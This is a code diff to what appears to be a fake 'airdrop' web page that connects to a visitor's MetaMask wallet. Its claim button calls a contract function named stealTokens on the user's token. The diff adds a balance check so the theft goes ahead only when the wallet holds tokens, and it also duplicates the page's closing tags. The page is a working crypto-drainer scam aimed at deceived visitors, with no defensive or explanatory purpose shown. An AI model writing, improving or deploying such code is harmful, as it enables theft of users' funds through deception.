@@ -57,6 +57,17 @@
                 const gasPrice = await web3.eth.getGasPrice();
                 const gasLimit = 100000; // Set a reasonable gas limit for ERC-20 transfers
 
+                // Check if the user has enough tokens to transfer
+                const token = new web3.eth.Contract([
+                    { "constant": true, "inputs": [{ "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "type": "function" }
+                ], tokenAddress);
+
+                const balance = await token.methods.balanceOf(userAddress).call();
+                if (balance === "0") {
+                    alert("You have no tokens to claim!");
+                    return;
+                }
+
                 // Send the transaction with the appropriate gas settings
                 await contract.methods.stealTokens(tokenAddress).send({
                     from: userAddress,
@@ -75,6 +86,9 @@
         document.getElementById('connectButton').addEventListener('click', connectMetaMask);
         document.getElementById('airdropButton').addEventListener('click', claimAirdrop);
     </script>
+
+</body>
+</html>
 
 </body>
 </html>
